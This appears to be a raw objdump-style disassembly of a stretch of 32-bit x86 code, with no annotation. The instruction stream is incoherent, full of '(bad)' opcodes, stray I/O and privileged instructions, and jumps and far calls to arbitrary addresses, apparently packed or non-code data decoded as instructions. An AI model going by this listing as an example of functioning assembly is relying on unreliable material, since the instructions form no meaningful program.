  40d84e:	push   ss
  40d84f:	sahf   
  40d850:	not    DWORD PTR [edx-0x7c6ef7db]
  40d856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d857:	add    esp,esi
  40d859:	xchg   edx,eax
  40d85a:	std    
  40d85b:	popf   
  40d85c:	test   DWORD PTR [ecx*2-0x11f68e73],0xe592cf9d
  40d867:	pop    ss
  40d868:	mov    ebp,0xbf9feaa1
  40d86d:	xchg   edx,eax
  40d86e:	lods   eax,DWORD PTR ds:[esi]
  40d86f:	inc    edi
  40d870:	leave  
  40d871:	or     cl,ch
  40d873:	add    esi,DWORD PTR [ecx]
  40d875:	xchg   BYTE PTR [ebx],al
  40d877:	xor    BYTE PTR [eax+ecx*2-0x1fdd6317],0x69
  40d87f:	fbstp  TBYTE PTR [esi+0x42783]
  40d885:	mov    ds,WORD PTR ds:0x6d4580c9
  40d88b:	outs   dx,BYTE PTR ds:[esi]
  40d88c:	inc    ebx
  40d88d:	xor    DWORD PTR [edx+0x280ef51c],edx
  40d893:	push   ebx
  40d894:	inc    esp
  40d895:	xor    DWORD PTR [ebx+ebp*1-0xc6e0954],eax
  40d89c:	scas   eax,DWORD PTR es:[edi]
  40d89d:	pop    edi
  40d89e:	sbb    al,0x0
  40d8a0:	in     eax,0xb5
  40d8a2:	sbb    eax,0x913d8108
  40d8a7:	(bad)  
  40d8a8:	data16 jp 0x40d873
  40d8ab:	psubsw mm0,QWORD PTR [edi]
  40d8ae:	jle    0x40d89b
  40d8b0:	push   0x69
  40d8b2:	sahf   
  40d8b3:	(bad)  
  40d8b4:	aam    0x3a
  40d8b6:	mov    eax,ds:0x92c59c3d
  40d8bb:	imul   ebx,ecx,0x99f04caf
  40d8c1:	mov    ch,0x1c
  40d8c3:	or     BYTE PTR [ecx+0x65],al
  40d8c6:	aaa    
  40d8c7:	jmp    DWORD PTR [esi]
  40d8c9:	cmp    cl,cl
  40d8cb:	je     0x40d8b2
  40d8cd:	jmp    0x40d896
  40d8cf:	pop    es
  40d8d0:	jmp    0x2fa8d21d
  40d8d5:	sbb    DWORD PTR [eax+0x0],ecx
  40d8d8:	je     0x40d948
  40d8da:	cdq    
  40d8db:	dec    edi
  40d8dc:	adc    DWORD PTR [edi+0x2e],eax
  40d8df:	push   esi
  40d8e1:	sub    ecx,ecx
  40d8e3:	je     0x40d8ca
  40d8e5:	sti    
  40d8e6:	mov    DWORD PTR [edi],0x4ced00e9
  40d8ec:	in     al,dx
  40d8ed:	call   0x6440e224
  40d8f2:	outs   dx,DWORD PTR ds:[esi]
  40d8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8f4:	dec    edi
  40d8f5:	into   
  40d8f6:	inc    edi
  40d8f7:	add    eax,ebp
  40d8f9:	mov    ch,0x5f
  40d8fb:	xchg   edx,eax
  40d8fc:	(bad)  
  40d8fd:	bnd jb 0x40d915
  40d900:	push   es
  40d901:	push   0x37
  40d903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d904:	push   DWORD PTR [ebx]
  40d906:	aaa    
  40d907:	fidivr WORD PTR [edi+0x970b0]
  40d90d:	cmp    DWORD PTR [eax-0x3c131540],ecx
  40d913:	test   eax,0xfdf3e872
  40d918:	mov    edi,0x567c6500
  40d91d:	xor    DWORD PTR [eax+0x20057506],0x6
  40d924:	add    BYTE PTR [ecx],al
  40d926:	pop    eax
  40d927:	mov    bh,dh
  40d929:	add    DWORD PTR [ebx+ecx*1+0x2b],esp
  40d92d:	rol    BYTE PTR [ecx],0xc8
  40d930:	push   es
  40d931:	add    BYTE PTR [ebx+0x18418d19],ch
  40d937:	add    BYTE PTR [ebx-0x14],0xc8
  40d93b:	ins    DWORD PTR es:[edi],dx
  40d93c:	jae    0x40d946
  40d93e:	cmp    BYTE PTR [eax],0x54
  40d941:	call   FWORD PTR [edi-0x77]
  40d944:	test   BYTE PTR [ecx],0xc4
  40d947:	pop    es
  40d948:	cmp    eax,0x1a
  40d94b:	clc    
  40d94c:	add    eax,0x609d0083
  40d951:	(bad)  
  40d952:	je     0x40d95a
  40d954:	mov    ds:0x41ac9be,al
  40d959:	add    BYTE PTR [ebp-0xb19f6b],cl
  40d95f:	gs add al,0xe8
  40d962:	xchg   edx,eax
  40d963:	mov    ch,0x6d
  40d965:	std    
  40d966:	add    eax,0xa
  40d969:	je     0x40d970
  40d96b:	pop    ebx
  40d96c:	ins    DWORD PTR es:[edi],dx
  40d96d:	add    BYTE PTR [ebp-0x2a],dh
  40d970:	xchg   DWORD PTR [ebx-0x14],edi
  40d973:	enter  0x5f9,0x2b
  40d977:	fdivr  DWORD PTR [esi-0x7e67f740]
  40d97d:	inc    ebx
  40d97e:	in     al,dx
  40d97f:	cmp    BYTE PTR [ebx+esi*2+0x8],dh
  40d983:	jo     0x40d97a
  40d985:	push   esp
  40d986:	(bad)  
  40d987:	fild   WORD PTR [eax]
  40d989:	shl    BYTE PTR [ebp-0x6a],0x87
  40d98d:	jnp    0x40d97b
  40d98f:	mov    cl,bh
  40d991:	add    eax,0xcc62312b
  40d996:	sar    DWORD PTR [ecx],0xa2
  40d999:	xchg   DWORD PTR [ebp+edx*2-0xe],eax
  40d99d:	call   0x5655:0x2f7a2974
  40d9a4:	pop    ss
  40d9a5:	xchg   edi,esi
  40d9a7:	icebp  
  40d9a8:	xchg   esp,eax
  40d9a9:	add    BYTE PTR [ebx+0x750435c4],al
  40d9af:	aaa    
  40d9b0:	sti    
  40d9b1:	ret    
  40d9b2:	enter  0x7300,0xaa
  40d9b6:	add    cl,BYTE PTR [ebp-0xcc318c]
  40d9bc:	pushf  
  40d9bd:	call   0x829a:0xcf8436aa
  40d9c4:	sbb    DWORD PTR [edx],eax
  40d9c6:	adc    DWORD PTR [esi],eax
  40d9c8:	mov    dl,0x5c
  40d9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9cb:	(bad)  
  40d9cc:	jge    0x40d96e
  40d9ce:	in     eax,dx
  40d9cf:	mov    edi,0xbe3e8
  40d9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9d5:	pop    esp
  40d9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9d7:	dec    edi
  40d9d8:	out    dx,al
  40d9d9:	je     0x40d9e5
  40d9db:	call   0xfeda472b
  40d9e0:	mov    dl,0x9
  40d9e2:	in     al,0x74
  40d9e4:	das    
  40d9e5:	and    ebx,DWORD PTR [ecx]
  40d9e7:	in     al,dx
  40d9e8:	xor    DWORD PTR ds:0x58f12b01,edx
  40d9ee:	les    eax,FWORD PTR [edi]
  40d9f0:	xor    DWORD PTR ds:0x4c61ec40,ebx
  40d9f6:	in     al,0xfe
  40d9f8:	and    al,0xaa
  40d9fa:	stos   BYTE PTR es:[edi],al
  40d9fb:	and    eax,0x8c99c6fc
  40da00:	hlt    
  40da01:	mov    ebp,0xaa1cff32
  40da06:	stos   BYTE PTR es:[edi],al
  40da07:	xchg   ebp,eax
  40da08:	in     eax,0x5e
  40da0a:	cdq    
  40da0b:	or     BYTE PTR [ecx+0x2a15e808],0x8c
  40da12:	mov    al,ds:0x6a06fe06
  40da17:	sbb    BYTE PTR [eax],al
  40da19:	pop    ebp
  40da1a:	or     BYTE PTR [edx+eax*1],dl
  40da1d:	sbb    cl,cl
  40da1f:	scas   eax,DWORD PTR es:[edi]
  40da20:	lds    esi,FWORD PTR [esi]
  40da22:	or     DWORD PTR [edx+0x7b],ecx
  40da25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da26:	dec    ecx
  40da27:	jmp    0x18ddcfb4
  40da2c:	sbb    DWORD PTR cs:[eax-0x66b6f425],edx
  40da33:	mov    ah,0x9a
  40da35:	aaa    
  40da36:	and    BYTE PTR [edi],bl
  40da38:	pop    eax
  40da39:	outs   dx,BYTE PTR ds:[esi]
  40da3a:	or     DWORD PTR [eax+eax*2+0x15],ebx
  40da3e:	cmp    dl,bl
  40da40:	add    al,0x1e
  40da42:	adc    eax,0x19d9aed
  40da47:	inc    ecx
  40da48:	daa    
  40da49:	pop    es
  40da4a:	(bad)  
  40da4b:	sub    eax,0xe901f0cc
  40da50:	xor    BYTE PTR [edx-0x5409663],ch
  40da56:	jl     0x40da03
  40da58:	xchg   edi,eax
  40da59:	jle    0x40d9fc
  40da5b:	adc    BYTE PTR [ebx],dh
  40da5d:	out    0x8e,al
  40da5f:	add    eax,0x738edd10
  40da64:	pop    es
  40da65:	leave  
  40da66:	popf   
  40da67:	call   0x360f:0x2902cf9a
  40da6e:	mov    ds,WORD PTR [ebx+0xc]
  40da71:	mov    esi,0xfbacdd14
  40da76:	mov    ss,ebp
  40da78:	cdq    
  40da79:	cmp    ecx,ecx
  40da7b:	push   ebx
  40da7c:	add    al,0x0
  40da7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da7f:	adc    al,0xc5
  40da81:	lods   al,BYTE PTR ds:[esi]
  40da82:	mov    eax,ds:0x6999be39
  40da87:	retf   
  40da88:	jmp    esp
  40da8a:	xor    dh,BYTE PTR [ebx+ecx*4]
  40da8d:	mov    ebp,0x910c15a8
  40da92:	fsubr  QWORD PTR [edi+edi*8]
  40da95:	sahf   
  40da96:	and    al,0xc9
  40da98:	jae    0x40da64
  40da9a:	leave  
  40da9b:	adc    eax,0x41953910
  40daa0:	pop    ebp
  40daa1:	xchg   BYTE PTR [eax-0x47f97c2],bh
  40daa7:	int    0xff
  40daa9:	jne    0x40dae9
  40daab:	icebp  
  40daac:	(bad)  
  40daad:	hlt    
  40daae:	push   esi
  40daaf:	ds (bad) 
  40dab1:	fsubr  QWORD PTR [edx]
  40dab3:	mov    eax,ds:0x8f986987
  40dab8:	out    0x15,eax
  40daba:	push   0xffffff8e
  40dabc:	(bad)  
  40dabd:	and    bh,ch
  40dabf:	stc    
  40dac0:	call   FWORD PTR [ebx-0x16985e53]
  40dac6:	xor    bl,BYTE PTR [esi+0x29fcc1bd]
  40dacc:	inc    ecx
  40dacd:	jmp    0x934cef7b
  40dad2:	cld    
  40dad3:	mov    ?,WORD PTR [ecx+esi*8-0x36]
  40dad7:	pop    ebp
  40dad8:	(bad)  
  40dad9:	push   ss
  40dada:	enter  0x25,0xe9
  40dade:	cdq    
  40dadf:	dec    ebx
  40dae0:	sbb    al,BYTE PTR [bx+si]
  40dae3:	adc    DWORD PTR [eax+0x0],ecx
  40dae6:	(bad)  
  40dae7:	daa    
  40dae8:	std    
  40dae9:	imul   edx,ebx,0x10814a9
  40daef:	dec    edx
  40daf0:	(bad)  
  40daf1:	(bad)  
  40daf2:	out    0xa,al
  40daf4:	or     DWORD PTR [eax],eax
  40daf6:	into   
  40daf7:	pop    eax
  40daf8:	es retf 0xf24d
  40dafc:	or     bh,bh
  40dafe:	push   esp
  40daff:	cmp    DWORD PTR [ebx],esp
  40db01:	sbb    al,0x0
  40db03:	ja     0x40db03
  40db05:	pop    es
  40db06:	call   0x3e4c15
  40db0b:	lock add al,0x0
  40db0e:	out    dx,eax
  40db0f:	push   ss
  40db10:	loop   0x40dae4
  40db12:	fs dec ecx
  40db14:	add    eax,0xdb8475ff
  40db19:	sbb    edi,edi
  40db1b:	dec    ebp
  40db1c:	std    
  40db1d:	out    0x6b,eax
  40db1f:	mov    bh,0x70
  40db21:	std    
  40db22:	push   0xbeef0948
  40db27:	inc    eax
  40db28:	mov    edi,0x70584162
  40db2d:	jae    0x40db3b
  40db2f:	xor    ah,BYTE PTR [ebp+edi*8+0x52614075]
  40db36:	call   edi
  40db38:	jo     0x40dba0
  40db3a:	add    BYTE PTR [eax],bl
  40db3c:	bound  edi,QWORD PTR [eax+ebp*2+0x40ec6b]
  40db43:	ja     0x40db40
  40db45:	or     ebp,DWORD PTR [edx+0x0]
  40db48:	sub    esi,DWORD PTR [edx+0x73]
  40db4b:	or     BYTE PTR [eax-0x4d],dh
  40db4e:	std    
  40db4f:	call   DWORD PTR [edi-0x41]
  40db52:	ror    BYTE PTR [eax],0x8
  40db55:	fmul   QWORD PTR [edx-0x5b37414]
  40db5b:	push   0xffffffd8
  40db5d:	fidiv  WORD PTR [ecx]
  40db5f:	(bad)  
  40db60:	mov    ebp,0xbdcde800
  40db65:	jno    0x40db64
  40db67:	mov    DWORD PTR [ebp-0x4294998c],ecx
  40db6d:	inc    edi
  40db6e:	add    bh,bh
  40db70:	cmp    eax,0xd74de800
  40db75:	je     0x40db74
  40db77:	call   FWORD PTR [ebp+0x71]
  40db7a:	std    
  40db7b:	jne    0x40dbae
  40db7d:	stos   BYTE PTR es:[edi],al
  40db7e:	stos   BYTE PTR es:[edi],al
  40db7f:	idiv   esp
  40db81:	mov    edx,0x9e73c896
  40db86:	add    dl,BYTE PTR [ebp-0x56]
  40db89:	mov    esi,0x488dc382
  40db8e:	add    al,0x6a
  40db90:	inc    edx
  40db91:	pop    ebx
  40db92:	adc    BYTE PTR [eax],cl
  40db94:	mov    DWORD PTR [esi+0x1976ff30],eax
  40db9a:	inc    ecx
  40db9b:	cld    
  40db9c:	fincstp 
  40db9e:	and    BYTE PTR [ecx+0x31],al
  40dba1:	jnp    0x40dbb3
  40dba3:	or     BYTE PTR [ecx-0x5a],cl
  40dba6:	xchg   ebp,eax
  40dba7:	(bad)  
  40dba8:	push   esi
  40dba9:	or     edx,DWORD PTR [ecx]
  40dbab:	cld    
  40dbac:	add    BYTE PTR [esi-0x73],cl
  40dbaf:	or     ch,al
  40dbb1:	outs   dx,BYTE PTR ds:[esi]
  40dbb2:	cmc    
  40dbb3:	xchg   esi,eax
  40dbb4:	(bad)  
  40dbb5:	push   0xdcffffe0
  40dbba:	push   ss
  40dbbb:	test   al,0x82
  40dbbd:	cmc    
  40dbbe:	cmp    DWORD PTR [edx],ebp
  40dbc0:	add    BYTE PTR [ebx+0x297496f6],bl
  40dbc6:	cmp    ch,BYTE PTR [ebx]
  40dbc8:	push   ebp
  40dbc9:	push   ss
  40dbca:	retf   
  40dbcb:	mov    WORD PTR [ebp+ecx*1-0x36],es
  40dbcf:	jle    0x40dc35
  40dbd1:	jo     0x40db75
  40dbd3:	xchg   ebp,eax
  40dbd4:	je     0x40dbff
  40dbd6:	cli    
  40dbd7:	stos   BYTE PTR es:[edi],al
  40dbd8:	std    
  40dbd9:	imul   dl
  40dbdb:	sub    DWORD PTR [eax],eax
  40dbdd:	pop    ecx
  40dbde:	and    DWORD PTR ds:[ecx+0x31],eax
  40dbe2:	mov    dh,BYTE PTR [edx+0x64]
  40dbe5:	jo     0x40db89
  40dbe7:	xchg   ebp,eax
  40dbe8:	xor    al,0x3
  40dbea:	pop    edx
  40dbeb:	inc    ebx
  40dbec:	add    cl,bl
  40dbee:	mov    ebp,0xa6c6ff39
  40dbf3:	ret    0xfe73
  40dbf6:	or     BYTE PTR [eax+0x40],dh
  40dbf9:	mov    ecx,0x6e55e020
  40dbfe:	or     DWORD PTR [ecx+0x4],eax
  40dc01:	xor    DWORD PTR [esi+ecx*4+0x28246b2b],ebx
  40dc08:	add    al,0x96
  40dc0a:	adc    eax,0x10596c1
  40dc0f:	rcl    ecx,0x0
  40dc12:	pop    es
  40dc13:	mov    WORD PTR [ebp+0x284a782b],gs
  40dc19:	add    al,0x9
  40dc1b:	or     ecx,ebp
  40dc1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc1e:	lods   al,BYTE PTR ds:[esi]
  40dc1f:	and    BYTE PTR [edx-0x71f70fe1],bh
  40dc25:	adc    BYTE PTR [ecx-0x75],bl
  40dc28:	sti    
  40dc29:	or     ecx,DWORD PTR [ecx-0x10]
  40dc2c:	std    
  40dc2d:	xchg   esi,eax
  40dc2e:	dec    edi
  40dc2f:	mov    edi,ebx
  40dc31:	fwait
  40dc32:	dec    esi
  40dc33:	rcl    DWORD PTR ds:0xdb8b3f97,0x97
  40dc3a:	aaa    
  40dc3b:	adc    eax,0x346aabf1
  40dc40:	push   esi
  40dc41:	xchg   esi,eax
  40dc42:	stc    
  40dc43:	(bad)  
  40dc44:	in     al,0x3
  40dc46:	test   BYTE PTR [esi+0x54],bh
  40dc49:	xor    dl,0x8d
  40dc4c:	rol    BYTE PTR [ebx],cl
  40dc4e:	fwait
  40dc4f:	aam    0x35
  40dc51:	adc    BYTE PTR [ecx],bh
  40dc53:	mov    eax,ds:0x8afe2f48
  40dc58:	outs   dx,DWORD PTR ds:[esi]
  40dc59:	inc    eax
  40dc5a:	cmc    
  40dc5b:	and    DWORD PTR [ecx+0x20],ebx
  40dc5e:	jo     0x40dc69
  40dc60:	push   ss
  40dc61:	adc    BYTE PTR [ecx],bh
  40dc63:	mov    eax,ds:0x8adf9588
  40dc68:	add    eax,0x738ad510
  40dc6d:	or     ebx,ecx
  40dc6f:	(bad)  
  40dc70:	call   FWORD PTR [ebx+0x2bc88b9f]
  40dc76:	add    BYTE PTR [esi-0x768dac76],bh
  40dc7c:	xchg   ebx,eax
  40dc7e:	fstp   QWORD PTR [ebx+0x9]
  40dc81:	push   0x1f
  40dc83:	mov    esp,0x14c10815
  40dc88:	ss inc esi
  40dc8b:	stos   BYTE PTR es:[edi],al
  40dc8c:	inc    ebp
  40dc8d:	cld    
  40dc8e:	push   ecx
  40dc8f:	jmp    0x815:0x9de94124
  40dc96:	rcl    DWORD PTR [esp+ecx*4+0x159ca6fe],0xfc
  40dc9e:	sahf   
  40dc9f:	ds add eax,ebp
  40dca2:	mov    bl,0x21
  40dca4:	mov    bh,dh
  40dca6:	mov    al,ds:0x1c000673
  40dcab:	test   al,0x9e
  40dcad:	and    BYTE PTR [ebp+0x30020a9],0x74
  40dcb4:	mov    esi,DWORD PTR [ecx+eiz*8-0x76]
  40dcb8:	or     al,0x54
  40dcba:	pushfw 
  40dcbc:	add    DWORD PTR [ebp+ebx*2+0x5d],0x32a864c6
  40dcc4:	mov    dh,BYTE PTR [ecx+eiz*8-0x36]
  40dcc8:	mov    edi,esp
  40dcca:	inc    esi
  40dccb:	mov    esp,0xa43d748a
  40dcd0:	adc    al,0x8
  40dcd2:	inc    ecx
  40dcd3:	call   0x3c7:0xea2eff36
  40dcda:	jmp    0xebbf23df
  40dcdf:	push   0xfffffff1
  40dce1:	lea    ebp,[ecx-0x17]
  40dce4:	sbb    cl,dl
  40dce6:	(bad)  
  40dce7:	xchg   esp,eax
  40dce8:	sub    ah,BYTE PTR [ecx+0x74b4004c]
  40dcee:	std    
  40dcef:	mov    DWORD PTR [ebp-0x4a34998f],edx
  40dcf5:	inc    esi
  40dcf6:	add    bh,bh
  40dcf8:	inc    ebp
  40dcf9:	(bad)  
  40dcfa:	out    0xcd,eax
  40dcfc:	int    0x74
  40dcfe:	std    
  40dcff:	inc    DWORD PTR ds:0x9075fd71
  40dd05:	pop    ebp
  40dd06:	jbe    0x40dd5c
  40dd08:	outs   dx,DWORD PTR ds:[esi]
  40dd09:	je     0x40dcd2
  40dd0b:	ret    0x584
  40dd0e:	push   ebp
  40dd0f:	mov    edi,DWORD PTR [esp+esi*2+0x73]
  40dd13:	or     al,0x70
  40dd15:	dec    eax
  40dd16:	pop    ebx
  40dd17:	dec    edi
  40dd19:	add    al,al
  40dd1b:	je     0x40dd4a
  40dd1d:	fstp   st(5)
  40dd1f:	sbb    DWORD PTR gs:0xcf8fe850,eax
  40dd26:	(bad)  
  40dd27:	call   FWORD PTR [eax]
  40dd29:	je     0x40dd9e
  40dd2b:	adc    BYTE PTR [eax],bh
  40dd2d:	je     0x40dda2
  40dd2f:	or     BYTE PTR [eax-0x40002a61],ah
  40dd35:	pop    ebp
  40dd36:	enter  0xcf56,0x74
  40dd3a:	mov    edx,0x8b55053c
  40dd40:	add    BYTE PTR [ecx+ecx*4-0x3e],bh
  40dd44:	clc    
  40dd45:	out    0x32,eax
  40dd47:	add    BYTE PTR [edx+0x41],ch
  40dd4a:	sahf   
  40dd4b:	jae    0x40dd55
  40dd4d:	xor    BYTE PTR [ecx-0x6cb000af],0x43
  40dd54:	cld    
  40dd55:	xchg   ebx,eax
  40dd56:	pop    edi
  40dd57:	push   esp
  40dd58:	dec    eax
  40dd59:	leave  
  40dd5a:	or     al,0x80
  40dd5c:	aas    
  40dd5d:	or     BYTE PTR [ecx],bl
  40dd5f:	jl     0x40ddc9
  40dd61:	and    eax,0x31004127
  40dd66:	(bad)  
  40dd67:	stos   BYTE PTR es:[edi],al
  40dd68:	or     eax,0xb027272
  40dd6d:	icebp  
  40dd6e:	push   es
  40dd6f:	xor    al,0x57
  40dd71:	fst    DWORD PTR [edx+eiz*1-0x3d943901]
  40dd78:	jae    0x40ddde
  40dd7a:	jmp    0xe5f7d5bc
  40dd7f:	mov    ebp,DWORD PTR [ecx+0x4b]
  40dd82:	sbb    BYTE PTR [bx+si],cl
  40dd85:	cdq    
  40dd86:	clc    
  40dd87:	xchg   edx,eax
  40dd88:	(bad)  
  40dd89:	sahf   
  40dd8a:	push   edi
  40dd8b:	sbb    al,bh
  40dd8d:	or     ebp,DWORD PTR [esi-0x6f]
  40dd90:	je     0x40ddcb
  40dd92:	pop    edx
  40dd93:	or     al,0xff
  40dd95:	xchg   BYTE PTR [edi-0x33868b6e],bh
  40dd9b:	out    0xfe,al
  40dd9d:	cld    
  40dd9e:	jns    0x40dd3a
  40dda0:	imul   ebp,DWORD PTR [esi-0x59],0xffffff92
  40dda4:	add    BYTE PTR [bx+di+0x15],bl
  40dda8:	inc    ebp
  40dda9:	add    BYTE PTR [esi+0x1d],bl
  40ddac:	mov    edi,fs
  40ddae:	pop    ebp
  40ddaf:	sub    DWORD PTR [ebx+0x17b23afe],edx
  40ddb5:	adc    ah,cl
  40ddb7:	(bad)  
  40ddb8:	sbb    al,bh
  40ddba:	loope  0x40ddb2
  40ddbc:	sbb    BYTE PTR [eax],cl
  40ddbe:	dec    ecx
  40ddbf:	(bad)  
  40ddc0:	mov    ecx,0xd2da2efe
  40ddc5:	push   ebp
  40ddc6:	fist   WORD PTR es:[edx-0x2535e68c]
  40ddcd:	push   ebp
  40ddce:	push   ss
  40ddcf:	iret   
  40ddd0:	(bad)  
  40ddd1:	xor    dh,cl
  40ddd3:	mov    BYTE PTR [edx-0x69c0f902],dl
  40ddd9:	lods   eax,DWORD PTR ds:[esi]
  40ddda:	cmp    DWORD PTR [edi+0x17],ebp
  40dddd:	test   dh,dh
  40dddf:	or     BYTE PTR [edi+ecx*4-0x640f0211],bl
  40dde6:	retf   0x15db
  40dde9:	xchg   ebx,eax
  40ddea:	jg     0x40de3e
  40ddec:	sub    cl,BYTE PTR [eax]
  40ddee:	xor    esi,ebx
  40ddf0:	jno    0x40dd92
  40ddf2:	iret   
  40ddf3:	std    
  40ddf4:	in     al,dx
  40ddf5:	fwait
  40ddf6:	dec    esp
  40ddf7:	jecxz  0x40ddee
  40ddf9:	xchg   edx,eax
  40ddfa:	sub    ecx,DWORD PTR [ecx+0x74]
  40ddfd:	lock dec esi
  40ddff:	or     BYTE PTR [ebx+0x45],0x31
  40de03:	fnop   
  40de05:	xchg   ebp,eax
  40de06:	or     DWORD PTR [eax-0x61ffcc2b],ecx
  40de0c:	std    
  40de0d:	clc    
  40de0e:	xor    edx,DWORD PTR [esi-0x2640f03]
  40de14:	pop    esi
  40de15:	mov    ebp,0x1b758e92
  40de1a:	xchg   ebx,eax
  40de1b:	jg     0x40de6e
  40de1d:	stos   BYTE PTR es:[edi],al
  40de1e:	push   DWORD PTR [esi-0x24]
  40de21:	jno    0x40ddc2
  40de23:	mov    bl,0x4c
  40de25:	mov    al,ds:0x308db3a
  40de2a:	into   
  40de2b:	pop    edi
  40de2c:	std    
  40de2d:	loopne 0x40ddca
  40de2f:	and    al,0xdc
  40de31:	test   DWORD PTR [edx+0x7e7ccdb9],edx
  40de37:	add    eax,0x314520df
  40de3c:	mov    DWORD PTR [ebp-0x2f1e42fd],ebp
  40de42:	xchg   ebp,eax
  40de43:	xchg   ebp,eax
  40de44:	enter  0x3ae8,0x19
  40de48:	cmp    DWORD PTR [ebx+0x29123103],ebp
  40de4e:	pop    ss
  40de4f:	push   ebp
  40de50:	ficom  WORD PTR [eax-0x78]
  40de53:	outs   dx,DWORD PTR ds:[esi]
  40de54:	xchg   BYTE PTR ds:0xfffdc6fe,bh
  40de5a:	cli    
  40de5b:	jge    0x40de2a
  40de5d:	imul   DWORD PTR [esi]
  40de5f:	sbb    DWORD PTR [ecx-0x23dfc97],eax
  40de65:	pop    es
  40de66:	adc    DWORD PTR [eax-0x3ce90179],edi
  40de6c:	std    
  40de6d:	test   DWORD PTR [ebx+0x7487c600],0xff01aaf1
  40de77:	(bad)  
  40de78:	mov    al,ds:0x1df17487
  40de7d:	sub    bh,bh
  40de7f:	je     0x40de3b
  40de81:	outs   dx,BYTE PTR ds:[esi]
  40de82:	imul   esp,esi,0xffffffc0
  40de85:	xchg   esi,edi
  40de87:	push   esp
  40de88:	mov    ch,0x6e
  40de8a:	jl     0x40dec8
  40de8c:	rol    BYTE PTR [edi-0x3e92e505],0xfe
  40de93:	(bad)  
  40de94:	mov    al,ds:0x758ff187
  40de99:	pcmpeqw mm1,QWORD PTR [esi-0x51040260]
  40dea0:	push   ds
  40dea1:	adc    eax,ebp
  40dea3:	mov    esp,DWORD PTR [edi]
  40dea5:	xchg   dh,bh
  40dea7:	ds stos BYTE PTR es:[edi],al
  40dea9:	dec    eax
  40deaa:	add    ebp,ecx
  40deac:	daa    
  40dead:	xchg   edx,eax
  40deae:	jmp    0x40df1a
  40deb0:	imul   eax,DWORD PTR [edx-0xccaecaa],0x111e7e3a
  40deba:	call   0xfec6e62c
  40debf:	pusha  
  40dec0:	out    dx,al
  40dec1:	test   BYTE PTR [edx+0x40d16b24],cl
  40dec7:	jmp    0xdd41257e
  40decc:	jb     0x40debf
  40dece:	add    edi,eax
  40ded0:	jae    0x40dedb
  40ded2:	push   edi
  40ded3:	add    BYTE PTR [eax],al
  40ded5:	pusha  
  40ded6:	lock aas 
  40ded8:	add    BYTE PTR [eax],bl
  40deda:	test   DWORD PTR [esi-0x17bfd48c],edi
  40dee0:	sti    
  40dee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dee2:	cwde   
  40dee3:	std    
  40dee4:	or     ebx,DWORD PTR [eax]
  40dee6:	and    DWORD PTR [ecx],ebx
  40dee8:	push   eax
  40dee9:	ror    BYTE PTR [ecx],0x0
  40deec:	out    dx,eax
  40deed:	xchg   BYTE PTR ds:0x989660c,ah
  40def3:	push   eax
  40def4:	dec    DWORD PTR [ebp-0x7e]
  40def7:	out    0x3,al
  40def9:	inc    esi
  40defa:	cdq    
  40defb:	std    
  40defc:	call   0x401dd5
  40df01:	les    ebx,FWORD PTR [esi+edi*4-0x47]
  40df05:	xchg   edi,eax
  40df06:	cwde   
  40df07:	std    
  40df08:	dec    DWORD PTR [edx-0x2f8c919]
  40df0e:	dec    esp
  40df0f:	std    
  40df10:	jne    0x40df76
  40df12:	cwde   
  40df13:	jae    0x40df1d
  40df15:	pusha  
  40df16:	sbb    dl,BYTE PTR [edx-0x1]
  40df19:	(bad)  
  40df1a:	cmp    cl,cl
  40df1c:	ret    0x98c
  40df1f:	push   ebp
  40df20:	mov    esi,DWORD PTR [esp+ecx*4+0x56dbe8c2]
  40df27:	bound  ecx,QWORD PTR [ebx+0x19]
  40df2a:	or     eax,0xc24c7500
  40df2f:	ror    BYTE PTR [eax+ecx*2],0x23
  40df33:	add    BYTE PTR [edx+0x58],ch
  40df36:	and    edi,edi
  40df38:	inc    DWORD PTR [eax]
  40df3a:	cmp    eax,0x32006885
  40df3f:	or     eax,0xd0895e8
  40df44:	add    BYTE PTR [ecx+0x75fd90dd],cl
  40df4a:	nop
  40df4b:	mov    al,ds:0xdb3154d3
  40df50:	(bad)
  40df54:	(bad)  
  40df55:	je     0x40df60
  40df57:	int3   
  40df58:	adc    eax,0x90439bfc
  40df5d:	je     0x40df8c
  40df5f:	dec    eax
  40df60:	add    ch,BYTE PTR [edx+0x31]
  40df63:	retf   0x4013
  40df66:	xor    DWORD PTR [edx+0x7d],esi
  40df69:	inc    esp
  40df6a:	ffree  st(2)
  40df6c:	sbb    al,0x0
  40df6e:	dec    ebx
  40df6f:	jb     0x40df8d
  40df71:	adc    cl,BYTE PTR [ebx+0x72]
  40df74:	(bad)  
  40df75:	je     0x40df44
  40df77:	or     esi,esi
  40df79:	arpl   WORD PTR [edx-0x4f],di
  40df7c:	add    al,BYTE PTR [ebp-0x7885940f]
  40df82:	xor    DWORD PTR [edx+0x2],esi
  40df85:	mov    eax,DWORD PTR [esi+eiz*2]
  40df88:	jp     0x40df9b
  40df8a:	mov    ah,0x2d
  40df8c:	xchg   esp,eax
  40df8d:	dec    edi
  40df8e:	or     esi,DWORD PTR [edx+0x18]
  40df91:	adc    cl,BYTE PTR [ebx]
  40df93:	jb     0x40dfaf
  40df95:	xor    DWORD PTR [edi],edx
  40df97:	xor    DWORD PTR [edi+edi*8],eax
  40df9a:	cld    
  40df9b:	mov    ebp,0x2100518e
  40dfa0:	cmc    
  40dfa1:	ret    
  40dfa2:	ja     0x40df7a
  40dfa4:	mov    dl,0x18
  40dfa6:	lock pop ecx
  40dfa8:	xor    al,BYTE PTR [eax-0x1]
  40dfab:	data16 stc 
  40dfad:	dec    eax
  40dfae:	call   0x485891dd
  40dfb3:	push   esi
  40dfb4:	sbb    eax,0x25dde79c
  40dfb9:	(bad)  
  40dfba:	(bad)  
  40dfbb:	mov    eax,0xc4fea02d
  40dfc0:	add    DWORD PTR [edx+edx*2-0x1710d19],ebx
  40dfc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfc8:	or     DWORD PTR [ecx-0x71],edx
  40dfcb:	popf   
  40dfcc:	jne    0x40e02b
